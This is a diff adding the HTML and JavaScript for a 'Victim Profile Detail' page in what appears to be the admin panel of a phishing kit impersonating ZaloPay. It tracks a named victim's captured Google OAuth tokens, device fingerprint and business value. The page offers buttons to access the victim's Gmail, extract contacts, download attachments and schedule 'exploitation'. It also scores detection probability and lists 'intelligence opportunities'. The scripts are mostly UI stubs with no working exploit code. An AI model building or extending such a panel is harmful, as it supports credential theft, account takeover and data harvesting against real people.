@@ -1,0 +1,846 @@
+
+
+Victim Profile Detail - ZaloPay Admin Portal
+
+
+<div class="container-fluid">
+    <!-- Header with Actions -->
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <div>
+            <nav aria-label="breadcrumb">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="victim_database.html">Victim Database</a></li>
+                    <li class="breadcrumb-item active">Profile Detail</li>
+                </ol>
+            </nav>
+            <h1 class="h3 mb-0 text-gray-800">Victim Profile Detail</h1>
+        </div>
+        <div class="d-flex gap-2">
+            <button class="btn btn-success" onclick="accessGmail()" id="gmailBtn">
+                <i class="fas fa-envelope me-1"></i>Access Gmail
+            </button>
+            <button class="btn btn-info" onclick="exportProfile()">
+                <i class="fas fa-download me-1"></i>Export
+            </button>
+            <button class="btn btn-warning" onclick="editProfile()">
+                <i class="fas fa-edit me-1"></i>Edit
+            </button>
+            <button class="btn btn-outline-secondary" onclick="goBack()">
+                <i class="fas fa-arrow-left me-1"></i>Back
+            </button>
+        </div>
+    </div>
+
+    <!-- Victim Overview Cards -->
+    <div class="row mb-4">
+        <!-- Basic Info Card -->
+        <div class="col-lg-4">
+            <div class="card shadow h-100">
+                <div class="card-header bg-gradient-primary text-white">
+                    <h6 class="m-0 font-weight-bold">
+                        <i class="fas fa-user me-2"></i>Basic Information
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="text-center mb-4">
+                        <img src="https://lh3.googleusercontent.com/a/profile_picture_url" 
+                             class="rounded-circle mb-3" width="80" height="80" alt="Profile Picture"
+                             onerror="this.src='https://via.placeholder.com/80/007bff/ffffff?text=N'">
+                        <h5 class="mb-1">Nguyễn Văn Nam</h5>
+                        <p class="text-muted mb-0">ceo@techcorp.vn</p>
+                        <div class="mt-2">
+                            <span class="badge bg-success">Validated</span>
+                            <span class="badge bg-warning">High Value</span>
+                            <span class="badge bg-info">Business</span>
+                        </div>
+                    </div>
+                    
+                    <table class="table table-sm table-borderless">
+                        <tr>
+                            <td><strong>Phone:</strong></td>
+                            <td>+84987654321</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Company:</strong></td>
+                            <td>TechCorp Vietnam</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Position:</strong></td>
+                            <td>CEO</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Domain:</strong></td>
+                            <td>techcorp.vn</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Capture Date:</strong></td>
+                            <td>2025-10-04 15:30</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Last Activity:</strong></td>
+                            <td>2 hours ago</td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Technical Details -->
+        <div class="col-lg-4">
+            <div class="card shadow h-100">
+                <div class="card-header bg-gradient-info text-white">
+                    <h6 class="m-0 font-weight-bold">
+                        <i class="fas fa-desktop me-2"></i>Technical Details
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <table class="table table-sm">
+                        <tr>
+                            <td><strong>IP Address:</strong></td>
+                            <td>
+                                <code>192.168.1.100</code>
+                                <span class="badge bg-primary ms-1">🇻🇳 VN</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>User Agent:</strong></td>
+                            <td>
+                                <small>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</small>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>Browser:</strong></td>
+                            <td>Chrome 118.0.0.0</td>
+                        </tr>
+                        <tr>
+                            <td><strong>OS:</strong></td>
+                            <td>Windows 10</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Screen:</strong></td>
+                            <td>1920x1080</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Timezone:</strong></td>
+                            <td>Asia/Ho_Chi_Minh</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Language:</strong></td>
+                            <td>vi-VN,vi;q=0.9,en;q=0.8</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Fingerprint ID:</strong></td>
+                            <td><code>fp_abc123def456ghi789</code></td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Security Assessment -->
+        <div class="col-lg-4">
+            <div class="card shadow h-100">
+                <div class="card-header bg-gradient-warning text-white">
+                    <h6 class="m-0 font-weight-bold">
+                        <i class="fas fa-shield-alt me-2"></i>Security Assessment
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="mb-3">
+                        <label class="form-label small">Market Value Score</label>
+                        <div class="progress mb-1" style="height: 20px;">
+                            <div class="progress-bar bg-warning" role="progressbar" style="width: 85%" aria-valuenow="85" aria-valuemin="0" aria-valuemax="100">85%</div>
+                        </div>
+                        <small class="text-muted">High-value target</small>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label class="form-label small">Detection Probability</label>
+                        <div class="progress mb-1" style="height: 20px;">
+                            <div class="progress-bar bg-success" role="progressbar" style="width: 15%" aria-valuenow="15" aria-valuemin="0" aria-valuemax="100">15%</div>
+                        </div>
+                        <small class="text-muted">Low risk of detection</small>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label class="form-label small">Security Awareness</label>
+                        <div class="progress mb-1" style="height: 20px;">
+                            <div class="progress-bar bg-danger" role="progressbar" style="width: 25%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100">25%</div>
+                        </div>
+                        <small class="text-muted">Low security awareness</small>
+                    </div>
+
+                    <div class="mb-3">
+                        <label class="form-label small">Exploitation Success Rate</label>
+                        <div class="progress mb-1" style="height: 20px;">
+                            <div class="progress-bar bg-success" role="progressbar" style="width: 92%" aria-valuenow="92" aria-valuemin="0" aria-valuemax="100">92%</div>
+                        </div>
+                        <small class="text-muted">Very high success rate</small>
+                    </div>
+
+                    <hr>
+                    <div class="small">
+                        <div class="d-flex justify-content-between mb-1">
+                            <span>Two-Factor Auth:</span>
+                            <span class="text-danger">Enabled</span>
+                        </div>
+                        <div class="d-flex justify-content-between mb-1">
+                            <span>Account Age:</span>
+                            <span>1,247 days</span>
+                        </div>
+                        <div class="d-flex justify-content-between mb-1">
+                            <span>Executive Level:</span>
+                            <span class="text-warning">High (85%)</span>
+                        </div>
+                        <div class="d-flex justify-content-between">
+                            <span>Business Value:</span>
+                            <span class="text-success">$1M-$10M</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Detailed Information Tabs -->
+    <div class="row">
+        <div class="col-12">
+            <div class="card shadow">
+                <div class="card-header">
+                    <ul class="nav nav-tabs card-header-tabs" id="profileTabs" role="tablist">
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link active" id="oauth-tab" data-bs-toggle="tab" data-bs-target="#oauth" type="button" role="tab">
+                                <i class="fab fa-google me-1"></i>OAuth Details
+                            </button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="session-tab" data-bs-toggle="tab" data-bs-target="#session" type="button" role="tab">
+                                <i class="fas fa-server me-1"></i>Session Data
+                            </button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="business-tab" data-bs-toggle="tab" data-bs-target="#business" type="button" role="tab">
+                                <i class="fas fa-building me-1"></i>Business Intel
+                            </button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="activity-tab" data-bs-toggle="tab" data-bs-target="#activity" type="button" role="tab">
+                                <i class="fas fa-history me-1"></i>Activity Log
+                            </button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="exploitation-tab" data-bs-toggle="tab" data-bs-target="#exploitation" type="button" role="tab">
+                                <i class="fas fa-crosshairs me-1"></i>Exploitation
+                            </button>
+                        </li>
+                    </ul>
+                </div>
+                <div class="card-body">
+                    <div class="tab-content" id="profileTabsContent">
+                        <!-- OAuth Details Tab -->
+                        <div class="tab-pane fade show active" id="oauth" role="tabpanel">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h6 class="text-primary">OAuth Provider Information</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Provider:</strong></td>
+                                            <td><i class="fab fa-google text-danger me-1"></i>Google</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Client ID:</strong></td>
+                                            <td><code>1234567890-abc123def456.googleusercontent.com</code></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Scopes Granted:</strong></td>
+                                            <td>
+                                                <span class="badge bg-success me-1">openid</span>
+                                                <span class="badge bg-success me-1">email</span>
+                                                <span class="badge bg-success me-1">profile</span>
+                                                <span class="badge bg-danger me-1">gmail.readonly</span>
+                                                <span class="badge bg-warning me-1">contacts.readonly</span>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Token Status:</strong></td>
+                                            <td><span class="badge bg-success">Active</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Issued At:</strong></td>
+                                            <td>2025-10-04 15:30:25</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Expires At:</strong></td>
+                                            <td>2025-10-04 16:30:25</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Last Refreshed:</strong></td>
+                                            <td>2025-10-04 15:35:10</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                                <div class="col-md-6">
+                                    <h6 class="text-info">Google Account Information</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Google ID:</strong></td>
+                                            <td><code>1234567890123456789</code></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Email Verified:</strong></td>
+                                            <td><span class="badge bg-success">True</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Given Name:</strong></td>
+                                            <td>Nam</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Family Name:</strong></td>
+                                            <td>Nguyễn Văn</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Locale:</strong></td>
+                                            <td>vi</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Hosted Domain:</strong></td>
+                                            <td>techcorp.vn</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Recovery Email:</strong></td>
+                                            <td>n***m@personal-email.com</td>
+                                        </tr>
+                                    </table>
+                                    
+                                    <div class="mt-3">
+                                        <button class="btn btn-sm btn-success me-2" onclick="validateTokens()">
+                                            <i class="fas fa-check me-1"></i>Validate Tokens
+                                        </button>
+                                        <button class="btn btn-sm btn-warning" onclick="refreshTokens()">
+                                            <i class="fas fa-sync me-1"></i>Refresh Tokens
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Session Data Tab -->
+                        <div class="tab-pane fade" id="session" role="tabpanel">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h6 class="text-primary">Session Information</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Session ID:</strong></td>
+                                            <td><code>session_20251004_153025_abc123</code></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>IP Address:</strong></td>
+                                            <td>192.168.1.100</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Proxy Used:</strong></td>
+                                            <td>
+                                                <div>socks5://vietnam-residential-01.proxy.com:1080</div>
+                                                <small class="text-muted">Residential proxy from ProxyProvider123</small>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Referrer:</strong></td>
+                                            <td>https://www.google.com/search?q=zalopay+merchant+registration</td>
+                                        </tr>
+                                    </table>
+
+                                    <h6 class="text-warning mt-4">UTM Parameters</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Source:</strong></td>
+                                            <td>google</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Medium:</strong></td>
+                                            <td>cpc</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Campaign:</strong></td>
+                                            <td>zalopay_merchant_q4_2025</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Content:</strong></td>
+                                            <td>business_registration</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                                <div class="col-md-6">
+                                    <h6 class="text-info">Device Fingerprint</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Screen Resolution:</strong></td>
+                                            <td>1920x1080</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Color Depth:</strong></td>
+                                            <td>24</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Platform:</strong></td>
+                                            <td>Win32</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Canvas Signature:</strong></td>
+                                            <td><code>a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6</code></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>WebGL Vendor:</strong></td>
+                                            <td>Intel Inc.</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>WebGL Renderer:</strong></td>
+                                            <td>Intel(R) HD Graphics 620</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Audio Fingerprint:</strong></td>
+                                            <td><code>44100:2:f32:0.1234567890</code></td>
+                                        </tr>
+                                    </table>
+
+                                    <h6 class="text-success mt-4">Browser Plugins</h6>
+                                    <div class="d-flex flex-wrap gap-1">
+                                        <span class="badge bg-secondary">Chrome PDF Plugin</span>
+                                        <span class="badge bg-secondary">Widevine Content Decryption</span>
+                                        <span class="badge bg-secondary">Native Client</span>
+                                    </div>
+
+                                    <h6 class="text-info mt-3">Installed Fonts</h6>
+                                    <div class="d-flex flex-wrap gap-1">
+                                        <span class="badge bg-light text-dark">Arial</span>
+                                        <span class="badge bg-light text-dark">Times New Roman</span>
+                                        <span class="badge bg-light text-dark">Helvetica</span>
+                                        <span class="badge bg-light text-dark">Calibri</span>
+                                        <span class="badge bg-light text-dark">Tahoma</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Business Intelligence Tab -->
+                        <div class="tab-pane fade" id="business" role="tabpanel">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h6 class="text-primary">Company Information</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Domain Age:</strong></td>
+                                            <td>892 days</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Company Size:</strong></td>
+                                            <td>Medium (50-200 employees)</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Industry:</strong></td>
+                                            <td>Technology</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Revenue Estimate:</strong></td>
+                                            <td>$1M-$10M annually</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Executive Level Score:</strong></td>
+                                            <td>
+                                                <div class="progress" style="height: 15px;">
+                                                    <div class="progress-bar bg-warning" style="width: 85%">85%</div>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                    </table>
+
+                                    <h6 class="text-warning mt-4">Data Access Assessment</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Gmail Access:</strong></td>
+                                            <td><span class="badge bg-success">Available</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Contacts Access:</strong></td>
+                                            <td><span class="badge bg-success">Available</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Calendar Access:</strong></td>
+                                            <td><span class="badge bg-success">Available</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Drive Access:</strong></td>
+                                            <td><span class="badge bg-danger">Denied</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Est. Email Count:</strong></td>
+                                            <td>15,420 emails</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Est. Contact Count:</strong></td>
+                                            <td>2,847 contacts</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                                <div class="col-md-6">
+                                    <h6 class="text-info">Intelligence Opportunities</h6>
+                                    <div class="list-group">
+                                        <div class="list-group-item d-flex justify-content-between align-items-center">
+                                            <div>
+                                                <i class="fas fa-envelope text-danger me-2"></i>
+                                                Extract business emails
+                                            </div>
+                                            <span class="badge bg-danger">High Priority</span>
+                                        </div>
+                                        <div class="list-group-item d-flex justify-content-between align-items-center">
+                                            <div>
+                                                <i class="fas fa-address-book text-warning me-2"></i>
+                                                Harvest contact database
+                                            </div>
+                                            <span class="badge bg-warning">Medium Priority</span>
+                                        </div>
+                                        <div class="list-group-item d-flex justify-content-between align-items-center">
+                                            <div>
+                                                <i class="fas fa-paperclip text-info me-2"></i>
+                                                Download sensitive attachments
+                                            </div>
+                                            <span class="badge bg-info">Medium Priority</span>
+                                        </div>
+                                        <div class="list-group-item d-flex justify-content-between align-items-center">
+                                            <div>
+                                                <i class="fas fa-chart-line text-success me-2"></i>
+                                                Analyze email patterns
+                                            </div>
+                                            <span class="badge bg-success">Low Priority</span>
+                                        </div>
+                                    </div>
+
+                                    <h6 class="text-success mt-4">Network Analysis</h6>
+                                    <div class="mb-3">
+                                        <label class="form-label small">Network Value Score</label>
+                                        <div class="progress" style="height: 15px;">
+                                            <div class="progress-bar bg-success" style="width: 78%">78%</div>
+                                        </div>
+                                        <small class="text-muted">High-value network connections</small>
+                                    </div>
+
+                                    <div class="small">
+                                        <strong>Key Relationships Identified:</strong>
+                                        <ul class="mt-2">
+                                            <li>CEO connections to 3 major corporations</li>
+                                            <li>Direct contact with government officials</li>
+                                            <li>Board member of 2 industry associations</li>
+                                            <li>Frequent communication with investors</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Activity Log Tab -->
+                        <div class="tab-pane fade" id="activity" role="tabpanel">
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-success"></div>
+                                    <div class="timeline-content">
+                                        <h6 class="timeline-title">Gmail Access Initiated</h6>
+                                        <p class="timeline-text">Successful OAuth token validation and Gmail API access established</p>
+                                        <small class="text-muted">2025-10-04 16:25:45 - 2 hours ago</small>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-info"></div>
+                                    <div class="timeline-content">
+                                        <h6 class="timeline-title">Profile Enrichment Completed</h6>
+                                        <p class="timeline-text">Business intelligence analysis completed. High-value target confirmed.</p>
+                                        <small class="text-muted">2025-10-04 15:40:30 - 3 hours ago</small>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-warning"></div>
+                                    <div class="timeline-content">
+                                        <h6 class="timeline-title">Credential Validation</h6>
+                                        <p class="timeline-text">OAuth tokens validated successfully. Business account confirmed.</p>
+                                        <small class="text-muted">2025-10-04 15:35:10 - 3 hours ago</small>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-primary"></div>
+                                    <div class="timeline-content">
+                                        <h6 class="timeline-title">OAuth Capture</h6>
+                                        <p class="timeline-text">Google OAuth flow completed. Tokens captured and stored securely.</p>
+                                        <small class="text-muted">2025-10-04 15:30:25 - 3 hours ago</small>
+                                    </div>
+                                </div>
+                                
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-secondary"></div>
+                                    <div class="timeline-content">
+                                        <h6 class="timeline-title">Initial Visit</h6>
+                                        <p class="timeline-text">Victim accessed landing page from Google search. Session tracking initiated.</p>
+                                        <small class="text-muted">2025-10-04 15:28:15 - 3 hours ago</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Exploitation Tab -->
+                        <div class="tab-pane fade" id="exploitation" role="tabpanel">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h6 class="text-danger">Exploitation Status</h6>
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>First Exploitation:</strong></td>
+                                            <td>2025-10-04 15:40:30</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Last Exploitation:</strong></td>
+                                            <td>2025-10-04 16:25:45</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Exploitation Count:</strong></td>
+                                            <td>3 sessions</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Success Rate:</strong></td>
+                                            <td>100%</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Gmail Accessed:</strong></td>
+                                            <td><span class="badge bg-success">Yes</span></td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Data Extracted:</strong></td>
+                                            <td><span class="badge bg-success">Yes</span></td>
+                                        </tr>
+                                    </table>
+
+                                    <div class="mt-4">
+                                        <h6 class="text-primary">Available Actions</h6>
+                                        <div class="d-grid gap-2">
+                                            <button class="btn btn-danger" onclick="initiateGmailExploitation()">
+                                                <i class="fas fa-envelope me-1"></i>Access Gmail Now
+                                            </button>
+                                            <button class="btn btn-warning" onclick="extractContacts()">
+                                                <i class="fas fa-address-book me-1"></i>Extract Contacts
+                                            </button>
+                                            <button class="btn btn-info" onclick="downloadAttachments()">
+                                                <i class="fas fa-paperclip me-1"></i>Download Attachments
+                                            </button>
+                                            <button class="btn btn-success" onclick="scheduleExploitation()">
+                                                <i class="fas fa-clock me-1"></i>Schedule Exploitation
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="col-md-6">
+                                    <h6 class="text-info">Data Extraction Summary</h6>
+                                    <div class="mb-3">
+                                        <label class="form-label small">Emails Extracted</label>
+                                        <div class="progress" style="height: 15px;">
+                                            <div class="progress-bar bg-info" style="width: 65%">65%</div>
+                                        </div>
+                                        <small class="text-muted">1,420 of 2,180 emails</small>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="form-label small">Contacts Extracted</label>
+                                        <div class="progress" style="height: 15px;">
+                                            <div class="progress-bar bg-warning" style="width: 45%">45%</div>
+                                        </div>
+                                        <small class="text-muted">567 of 1,267 contacts</small>
+                                    </div>
+                                    
+                                    <div class="mb-3">
+                                        <label class="form-label small">Attachments Downloaded</label>
+                                        <div class="progress" style="height: 15px;">
+                                            <div class="progress-bar bg-success" style="width: 23%">23%</div>
+                                        </div>
+                                        <small class="text-muted">45 of 198 attachments</small>
+                                    </div>
+
+                                    <h6 class="text-warning mt-4">Recent Extractions</h6>
+                                    <div class="list-group">
+                                        <div class="list-group-item">
+                                            <div class="d-flex w-100 justify-content-between">
+                                                <h6 class="mb-1">Email batch #3</h6>
+                                                <small>2 hours ago</small>
+                                            </div>
+                                            <p class="mb-1">Extracted 234 business emails</p>
+                                            <small>Status: Completed</small>
+                                        </div>
+                                        <div class="list-group-item">
+                                            <div class="d-flex w-100 justify-content-between">
+                                                <h6 class="mb-1">Contact sync</h6>
+                                                <small>3 hours ago</small>
+                                            </div>
+                                            <p class="mb-1">Synchronized 156 contacts</p>
+                                            <small>Status: Completed</small>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.bg-gradient-primary {
+    background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
+}
+
+.bg-gradient-info {
+    background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
+}
+
+.bg-gradient-warning {
+    background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);
+}
+
+.timeline {
+    position: relative;
+    padding-left: 30px;
+}
+
+.timeline::before {
+    content: '';
+    position: absolute;
+    left: 15px;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: #e3e6f0;
+}
+
+.timeline-item {
+    position: relative;
+    margin-bottom: 2rem;
+}
+
+.timeline-marker {
+    position: absolute;
+    left: -23px;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 3px solid white;
+    box-shadow: 0 0 0 2px #e3e6f0;
+}
+
+.timeline-content {
+    background: #f8f9fa;
+    padding: 1rem;
+    border-radius: 8px;
+    border-left: 3px solid #007bff;
+}
+
+.timeline-title {
+    margin-bottom: 0.5rem;
+    color: #495057;
+}
+
+.timeline-text {
+    margin-bottom: 0.5rem;
+    color: #6c757d;
+}
+</style>
+
+<script>
+function accessGmail() {
+    if (confirm('Access Gmail account for this victim? This action will be logged.')) {
+        showToast('Accessing Gmail account...', 'info');
+        setTimeout(() => {
+            window.open('gmail_access.html?victim=ceo@techcorp.vn', '_blank');
+        }, 1000);
+    }
+}
+
+function exportProfile() {
+    showToast('Exporting victim profile...', 'info');
+    setTimeout(() => {
+        showToast('Profile exported successfully', 'success');
+    }, 2000);
+}
+
+function editProfile() {
+    showToast('Opening profile editor...', 'info');
+}
+
+function goBack() {
+    window.location.href = 'victim_database.html';
+}
+
+function validateTokens() {
+    showToast('Validating OAuth tokens...', 'info');
+    setTimeout(() => {
+        showToast('Tokens are valid and active', 'success');
+    }, 1500);
+}
+
+function refreshTokens() {
+    showToast('Refreshing OAuth tokens...', 'warning');
+    setTimeout(() => {
+        showToast('Tokens refreshed successfully', 'success');
+    }, 2000);
+}
+
+function initiateGmailExploitation() {
+    if (confirm('Initiate Gmail exploitation? This will start data extraction immediately.')) {
+        showToast('Gmail exploitation initiated', 'danger');
+        setTimeout(() => {
+            showToast('Data extraction in progress...', 'info');
+        }, 1000);
+    }
+}
+
+function extractContacts() {
+    showToast('Starting contact extraction...', 'warning');
+    setTimeout(() => {
+        showToast('Contact extraction completed', 'success');
+    }, 3000);
+}
+
+function downloadAttachments() {
+    showToast('Downloading email attachments...', 'info');
+    setTimeout(() => {
+        showToast('45 attachments downloaded', 'success');
+    }, 2500);
+}
+
+function scheduleExploitation() {
+    showToast('Opening exploitation scheduler...', 'info');
+}
+
+function showToast(message, type = 'info') {
+    const toastHtml = `
+        <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'} border-0" role="alert">
+            <div class="d-flex">
+                <div class="toast-body">${message}</div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+            </div>
+        </div>
+    `;
+    
+    let toastContainer = document.getElementById('toastContainer');
+    if (!toastContainer) {
+        toastContainer = document.createElement('div');
+        toastContainer.id = 'toastContainer';
+        toastContainer.className = 'toast-container position-fixed top-0 end-0 p-3';
+        document.body.appendChild(toastContainer);
+    }
+    
+    toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    const toast = new bootstrap.Toast(toastContainer.lastElementChild);
+    toast.show();
+}
+</script>
